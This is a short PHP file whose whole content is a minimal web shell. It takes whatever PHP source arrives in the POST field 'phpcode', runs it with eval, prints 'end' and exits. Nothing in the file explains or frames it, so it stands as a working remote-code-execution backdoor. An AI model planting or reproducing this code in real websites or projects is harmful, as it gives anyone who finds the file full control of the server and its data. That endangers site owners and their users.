<?php
if(isset($_POST['phpcode'])){
	eval("?".">$_POST[phpcode]<?");
	echo "end";
	exit;
}
?>